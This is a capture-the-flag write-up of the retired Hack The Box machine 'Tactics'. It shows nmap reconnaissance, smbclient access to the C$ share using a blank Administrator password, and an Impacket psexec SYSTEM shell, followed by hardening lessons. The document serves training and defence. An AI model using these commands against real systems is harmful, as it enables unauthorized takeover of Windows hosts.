# HTB Tactics — Full Writeup

**Platform:** Hack The Box  
**Difficulty:** Very Easy  
**OS:** Windows  
**Category:** Starting Point  
**Status:** Retired  

---

## Overview

Tactics is a very easy Windows machine with SMB exposed and no password set on the Administrator account. The default administrative share `C$` is accessible, allowing full filesystem access. From there, Impacket's `psexec.py` provides an interactive shell as SYSTEM.

**Full chain:**
```
SMB with null/no-password Administrator authentication
  → C$ administrative share access (full filesystem)
    → psexec.py for interactive SYSTEM shell
```

---

## Reconnaissance

### Port Scan

```bash
nmap -sC -sV -Pn -oN Tactics_nmap.txt 10.129.18.180
```

| Port | Service | Version |
|------|---------|---------|
| 135 | MSRPC | Microsoft Windows RPC |
| 139 | NetBIOS | Microsoft Windows netbios-ssn |
| 445 | SMB | Microsoft-DS |

The `-Pn` flag is required as Windows firewall blocks ICMP ping by default.

### SMB Enumeration

List available shares using the Administrator account with no password:

```bash
smbclient -L //10.129.18.180 -U Administrator -N
```

The `C$` administrative share is accessible, mapping to the entire `C:\` drive.

---

## Step 1 — Flag Retrieval via SMB

### Direct Access

Connect to the `C$` share and retrieve the flag:

```bash
smbclient //10.129.18.180/C$ -U Administrator -N
cd Users\Administrator\Desktop
get flag.txt
```

### Interactive Shell (alternative path)

For a full interactive shell, use Impacket's `psexec.py`:

```bash
impacket-psexec Administrator@10.129.18.180
```

This returns a SYSTEM-level shell. Read the flag:

```cmd
type C:\Users\Administrator\Desktop\flag.txt
```

---

## Flag

| Flag | Location |
|------|----------|
| flag.txt | `C:\Users\Administrator\Desktop\flag.txt` |

---

## Tools Used

| Tool | Purpose |
|------|---------|
| nmap | Port scanning and service enumeration |
| smbclient | SMB share enumeration and file access |
| impacket-psexec | Interactive SYSTEM shell via SMB |

---

## Key Takeaways

**Always set a password on Administrator** — The entire compromise relies on the Administrator account having no password. This is a basic hardening step that would have prevented all access.

**Administrative shares expose the full filesystem** — Windows creates hidden shares (`C$`, `ADMIN$`, `IPC$`) by default. If an attacker authenticates to SMB, these shares give complete filesystem access without needing to find a custom share.

**`-Pn` is essential for Windows targets** — Windows firewall blocks ICMP by default. Without `-Pn`, nmap will report the host as down and skip the scan entirely.
